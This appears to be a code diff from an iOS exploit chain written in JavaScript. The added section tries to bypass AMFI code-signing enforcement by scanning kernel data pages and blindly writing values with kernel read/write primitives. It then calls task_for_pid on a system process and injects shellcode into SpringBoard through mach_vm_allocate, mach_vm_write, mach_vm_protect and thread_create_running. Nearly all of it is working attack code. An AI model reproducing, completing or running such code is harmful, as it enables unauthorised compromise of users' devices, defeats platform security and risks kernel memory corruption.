@@ -8390,9 +8390,140 @@
           }
         } else {
           LOG("[M6] task_for_pid failed (expected - no entitlement), need kernel-based injection");
-          // Skip AMFI scanning (too slow/hangs), directly use existing GPU krw capability
-          LOG("[M6] Skipping AMFI patch, using GPU krw for injection");
-          uwrite64(surface_address + 0xF878n, 0x1n); // Mark ready for GPU-based injection
+          LOG("[A2] ==============================================");
+          LOG("[A2] Starting AMFI bypass via KC data page scan");
+          LOG("[A2] ==============================================");
+
+          // A2: Scan KC data pages near data_page for zeroed int32 (cs_enforcement_disable)
+          // then uwrite64(1) to disable AMFI, then retry task_for_pid
+          let a2_kb = (typeof kernel_base_global !== 'undefined' && kernel_base_global != 0n && kernel_base_global !== 0xFFFFFFF007004000n)
+                      ? kernel_base_global : 0xFFFFFFF007004000n;
+          LOG(`[A2] kernel_base=${a2_kb.hex()}`);
+
+          // A2.0: Resolve mpd_task_self in this scope (was defined inside the if-block above)
+          LOG("[A2] Step 0: testing mpd_fcall health...");
+          let a2_task_for_pid = tfp_raw_local;
+          try {
+            let a2_getpid_fn = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "getpid");
+            LOG(`[A2] getpid sym=${a2_getpid_fn.hex()}`);
+            let a2_pid = mpd_fcall(a2_getpid_fn.noPAC(), 0n, 0n, 0n, 0n, 0n, 0n, 0n, 0n);
+            LOG(`[A2] getpid() = ${a2_pid}`);
+            if (a2_pid === 0n || a2_pid === -1n) {
+              LOG("[A2] mpd_fcall broken, aborting A2");
+              throw new Error("fcall broken");
+            }
+            LOG("[A2] Step 0b: calling mach_task_self...");
+            let mpd_task_self_local = mpd_fcall(mach_task_self_raw.noPAC(), 0n, 0n, 0n, 0n, 0n, 0n, 0n, 0n);
+            LOG(`[A2] mpd_task_self=${mpd_task_self_local.hex()}, tfp=${tfp_raw_local.hex()}`);
+          } catch(e) {
+            LOG(`[A2] Step 0 failed: ${e.message||e}`);
+          }
+
+          LOG("[A2] Step 1: building scan pages...");
+          // A2.1: Only scan data_page ± 8KB (9 pages) to avoid massive uread64 loops
+          // Each uread64 takes ~2s via GPU, so 9 pages × 16 offsets = ~288s max
+          let a2_pages = [];
+          for (let off = -0x8000n; off <= 0x8000n; off += 0x1000n) {
+            a2_pages.push(data_page + off);
+          }
+          LOG(`[A2] Scanning ${a2_pages.length} pages around data_page (${data_page.hex()})...`);
+
+          let a2_cands = [];
+          let a2_reads = 0;
+
+          for (let pi = 0; pi < a2_pages.length; pi++) {
+            let pg = a2_pages[pi];
+            if (a2_cands.length >= 20) break;
+            try {
+              let probe = uread64(pg);
+              a2_reads++;
+              if (probe === 0xffffffffffffffffn) continue;
+              for (let off = 0n; off < 0x1000n && a2_cands.length < 20; off += 64n) {
+                a2_reads++;
+                let v = uread64(pg + off);
+                let lo32 = v & 0xFFFFFFFFn;
+                let hi32 = (v >> 32n) & 0xFFFFFFFFn;
+                if (lo32 === 0n && hi32 !== 0n && hi32 !== 0xFFFFFFFFn) {
+                  a2_cands.push({addr: pg + off, half: 'lo', val: v});
+                } else if (hi32 === 0n && lo32 !== 0n && lo32 !== 0xFFFFFFFFn) {
+                  a2_cands.push({addr: pg + off, half: 'hi', val: v});
+                } else if (v === 0n) {
+                  a2_cands.push({addr: pg + off, half: 'all', val: v});
+                }
+              }
+              LOG(`[A2] page ${pi+1}/${a2_pages.length} done, reads=${a2_reads} cands=${a2_cands.length}`);
+            } catch(e) { LOG(`[A2] page ${pi} error: ${e.message||e}`); }
+          }
+          LOG(`[A2] Scan done: ${a2_reads} reads, ${a2_cands.length} candidates`);
+          for (let c of a2_cands.slice(0, 10)) LOG(`[A2]   cand: addr=${c.addr.hex()} half=${c.half} val=${c.val.hex()}`);
+
+          // Test top candidates: write 1 to zero half, then task_for_pid
+          let a2_patched = false;
+          let a2_tested = 0;
+
+          for (let cand of a2_cands) {
+            if (a2_tested >= 10 || a2_patched) break;
+            a2_tested++;
+            let orig = cand.val;
+            let new_val;
+            if (cand.half === 'lo') new_val = (orig & 0xFFFFFFFF00000000n) | 1n;
+            else if (cand.half === 'hi') new_val = (orig & 0xFFFFFFFFn) | (1n << 32n);
+            else new_val = 1n;
+
+            LOG(`[A2] Test #${a2_tested}: ${cand.addr.hex()} writing ${new_val.hex()}`);
+            try {
+              uwrite64(cand.addr, new_val);
+              let rb = uread64(cand.addr);
+              if (rb !== new_val) { LOG(`[A2]   verify fail: ${rb.hex()}`); continue; }
+
+              let tbuf = mpd_malloc(8n);
+              mpd_write64(tbuf, 0n);
+              let tret = mpd_fcall(a2_task_for_pid.noPAC(), mpd_task_self_local, 34n, tbuf, 0n, 0n, 0n, 0n, 0n);
+              let tport = mpd_read64(tbuf);
+              LOG(`[A2]   task_for_pid(34) ret=${tret} port=${tport.hex()}`);
+
+              if (tret === 0n && tport !== 0n) {
+                LOG(`[A2] SUCCESS! cs_enforcement_disable at ${cand.addr.hex()}, port=${tport.hex()}`);
+                a2_patched = true;
+                // Inject SpringBoard with this port
+                let mach_vm_alloc = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_allocate");
+                let mach_vm_write = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_write");
+                let mach_vm_prot = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_protect");
+                let ab = mpd_malloc(8n); mpd_write64(ab, 0n);
+                let ar = mpd_fcall(mach_vm_alloc.noPAC(), tport, ab, 0x4000n, 1n, 0n, 0n, 0n, 0n);
+                let ra = mpd_read64(ab);
+                LOG(`[A2] vm_alloc ret=${ar} addr=${ra.hex()}`);
+                if (ar === 0n && ra !== 0n) {
+                  let sc = mpd_malloc(8n);
+                  mpd_write64(sc, 0xD65F03C014000000n);
+                  mpd_fcall(mach_vm_write.noPAC(), tport, ra, sc, 8n, 0n, 0n, 0n, 0n);
+                  if (mach_vm_prot.noPAC() !== 0n) mpd_fcall(mach_vm_prot.noPAC(), tport, ra, 0x4000n, 0n, 7n, 0n, 0n, 0n);
+                  uwrite64(surface_address + 0xF878n, ra);
+                  uwrite64(surface_address + 0xF880n, tport);
+                  LOG("[A2] SpringBoard injection prepared via A2");
+                  let tcr = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "thread_create_running");
+                  if (tcr != 0n && tcr.noPAC() !== 0n) {
+                    let tb = mpd_malloc(8n); mpd_write64(tb, 0n);
+                    let tr = mpd_fcall(tcr.noPAC(), tport, ra, 0n, tb, 0n, 0n, 0n, 0n);
+                    let tp = mpd_read64(tb);
+                    LOG(`[A2] thread_create_running ret=${tr} thread=${tp.hex()}`);
+                    if (tr === 0n) uwrite64(surface_address + 0xF888n, tp);
+                  }
+                }
+                break;
+              }
+              // Restore original
+              uwrite64(cand.addr, orig);
+            } catch(e) {
+              LOG(`[A2]   error: ${e.message || e}`);
+              try { uwrite64(cand.addr, orig); } catch(e2) {}
+            }
+          }
+
+          if (!a2_patched) {
+            LOG("[A2] AMFI bypass not achieved, marking GPU krw fallback");
+            uwrite64(surface_address + 0xF878n, 0x1n);
+          }
         }
         // NOTE: mpd_free not defined, memory reclaimed on exit
       } else {
